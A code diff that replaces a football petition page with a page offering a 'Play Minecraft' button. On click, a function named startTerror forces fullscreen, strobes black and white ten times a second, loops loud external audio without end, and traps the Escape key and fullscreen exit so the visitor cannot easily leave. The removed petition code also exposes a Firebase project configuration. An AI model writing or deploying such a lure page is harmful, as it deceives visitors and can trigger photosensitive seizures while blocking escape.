@@ -1,175 +1,170 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Mbappe Out</title>
-
-  <style>
-    body {
-      margin: 0;
-      font-family: Arial, Helvetica, sans-serif;
-      background-color: #0b0b0b;
-      color: white;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      min-height: 100vh;
-    }
-
-    h1 {
-      margin-top: 20px;
-      font-size: 3rem;
-      letter-spacing: 2px;
-    }
-
-    .container {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 40px;
-      justify-content: center;
-      align-items: center;
-      margin-top: 40px;
-      width: 90%;
-    }
-
-    .image-box {
-      position: relative;
-      max-width: 500px;
-    }
-
-    .image-box img {
-      width: 100%;
-      border-radius: 12px;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.6);
-    }
-
-    .big-text {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%) rotate(80deg);
-      font-size: 5rem;
-      font-weight: 900;
-      color: rgba(255, 0, 0, 0.85);
-      text-shadow: 2px 2px 10px black;
-      pointer-events: none;
-    }
-
-    .petition {
-      max-width: 320px;
-      text-align: right;
-      display: flex;
-      flex-direction: column;
-      align-items: flex-end;
-    }
-
-    .description {
-      font-size: 0.9rem;
-      color: #ccc;
-      margin-bottom: 20px;
-      line-height: 1.5;
-    }
-
-    button {
-      padding: 12px 20px;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      background: red;
-      color: white;
-      font-weight: bold;
-      margin-bottom: 15px;
-    }
-
-    button:hover {
-      background: darkred;
-    }
-
-    .count {
-      font-size: 1.2rem;
-      font-weight: bold;
-    }
-
-    .disabled {
-      opacity: 0.5;
-      cursor: not-allowed;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Click to Play</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: black;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            overflow: hidden;
+            user-select: none;
+        }
+        #playBtn {
+            padding: 30px 80px;
+            font-size: 48px;
+            font-weight: bold;
+            border: 4px solid white;
+            background: transparent;
+            color: white;
+            cursor: pointer;
+            border-radius: 20px;
+            transition: 0.15s;
+            letter-spacing: 4px;
+            z-index: 10;
+        }
+        #playBtn:hover {
+            background: white;
+            color: black;
+            transform: scale(1.05);
+        }
+        #overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 999;
+        }
+    </style>
 </head>
 <body>
 
-  <h1>Mbappe Out</h1>
+    <button id="playBtn">Play Minecraft</button>
+    <div id="overlay"></div>
 
-  <div class="container">
+    <script>
+        (function() {
+            const btn = document.getElementById('playBtn');
+            const overlay = document.getElementById('overlay');
+            let audio = null;
+            let colorInterval = null;
+            let audioInterval = null;
+            let isPlaying = false;
 
-    <div class="image-box">
-      <img src="https://www.image2url.com/r2/default/images/1778327903204-69fcae4c-3de2-454b-9337-b752a8f36d8d.webp" />
-      <div class="big-text">Mbappe</div>
-    </div>
+            // Pre-create audio
+            audio = new Audio('https://www.image2url.com/r2/default/audio/1781189273445-63fdf56a-4b63-4e73-a0a3-7b11d2754bf5.mp3');
+            audio.preload = 'auto';
+            audio.loop = false; // we'll handle looping manually
+            audio.volume = 1.0;
 
-    <div class="petition">
-      <div class="description">
-        Madridistas, make your voice heard. If you believe change is needed, don't stay silent — sign this petition and stand for what you think is best for the club's future.
-      </div>
+            function startTerror() {
+                if (isPlaying) return;
+                isPlaying = true;
 
-      <button id="signBtn">Sign Petition</button>
-      <div class="count" id="count">Loading...</div>
-    </div>
+                // Hide button
+                btn.style.display = 'none';
 
-  </div>
+                // Show overlay
+                overlay.style.display = 'block';
 
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
-    import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-analytics.js";
-    import { getDatabase, ref, onValue, runTransaction } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+                // 1. Fullscreen
+                try {
+                    if (document.documentElement.requestFullscreen) {
+                        document.documentElement.requestFullscreen();
+                    } else if (document.documentElement.webkitRequestFullscreen) {
+                        document.documentElement.webkitRequestFullscreen();
+                    } else if (document.documentElement.msRequestFullscreen) {
+                        document.documentElement.msRequestFullscreen();
+                    }
+                } catch(e) {}
 
-    const firebaseConfig = {
-      apiKey: "AIzaSyBXKXlusMoJMH2e3B839xqF-Ii61j8tBo",
-      authDomain: "mbappeout-c0f1c.firebaseapp.com",
-      databaseURL: "https://mbappeout-c0f1c-default-rtdb.firebaseio.com",
-      projectId: "mbappeout-c0f1c",
-      storageBucket: "mbappeout-c0f1c.firebasestorage.app",
-      messagingSenderId: "533365630248",
-      appId: "1:533365630248:web:cbe2abc5bfbdd72c9cdc1d",
-      measurementId: "G-RDPM9R9VKK"
-    };
+                // 2. Strobe background black/white every 0.1s
+                let flashState = false;
+                colorInterval = setInterval(() => {
+                    flashState = !flashState;
+                    overlay.style.backgroundColor = flashState ? 'white' : 'black';
+                }, 100);
 
-    const app = initializeApp(firebaseConfig);
-    const analytics = getAnalytics(app);
-    const db = getDatabase(app);
-    const votesRef = ref(db, "petitionCount");
+                // 3. Play audio nonstop (retrigger on end)
+                function playLoop() {
+                    if (!isPlaying) return;
+                    audio.currentTime = 0;
+                    audio.play().catch(() => {});
+                }
 
-    const countEl = document.getElementById("count");
-    const btn = document.getElementById("signBtn");
+                // Start first play
+                playLoop();
 
-    let hasSigned = localStorage.getItem("signedMbappePetition");
+                // Re-trigger every time the audio ends
+                audio.addEventListener('ended', playLoop);
 
-    if (hasSigned) {
-      btn.disabled = true;
-      btn.classList.add("disabled");
-    }
+                // Also a safety interval to ensure it keeps playing
+                audioInterval = setInterval(() => {
+                    if (audio.paused && isPlaying) {
+                        audio.currentTime = 0;
+                        audio.play().catch(() => {});
+                    }
+                }, 500);
+            }
 
-    onValue(votesRef, (snapshot) => {
-      const value = snapshot.val() || 0;
-      countEl.textContent = value + (value === 1 ? " person signed" : " people signed");
-    });
+            btn.addEventListener('click', startTerror);
 
-    btn.addEventListener("click", () => {
-      if (hasSigned) return;
+            // Prevent exiting fullscreen easily (re-request fullscreen on exit)
+            document.addEventListener('fullscreenchange', () => {
+                if (!document.fullscreenElement && isPlaying) {
+                    try {
+                        document.documentElement.requestFullscreen();
+                    } catch(e) {}
+                }
+            });
+            document.addEventListener('webkitfullscreenchange', () => {
+                if (!document.webkitFullscreenElement && isPlaying) {
+                    try {
+                        document.documentElement.webkitRequestFullscreen();
+                    } catch(e) {}
+                }
+            });
 
-      runTransaction(votesRef, (current) => {
-        return (current || 0) + 1;
-      });
+            // Trap escape key — prevent easy exit
+            document.addEventListener('keydown', (e) => {
+                if (e.key === 'Escape' && isPlaying) {
+                    e.preventDefault();
+                    // Re-request fullscreen
+                    try {
+                        if (document.documentElement.requestFullscreen) {
+                            document.documentElement.requestFullscreen();
+                        } else if (document.documentElement.webkitRequestFullscreen) {
+                            document.documentElement.webkitRequestFullscreen();
+                        }
+                    } catch(ex) {}
+                }
+            });
 
-      localStorage.setItem("signedMbappePetition", "true");
-      hasSigned = true;
+            // Cleanup on page unload just in case
+            window.addEventListener('beforeunload', () => {
+                if (colorInterval) clearInterval(colorInterval);
+                if (audioInterval) clearInterval(audioInterval);
+                if (audio) {
+                    audio.pause();
+                    audio.src = '';
+                }
+                isPlaying = false;
+            });
 
-      btn.disabled = true;
-      btn.classList.add("disabled");
-    });
-  </script>
+        })();
+    </script>
 
 </body>
 </html>
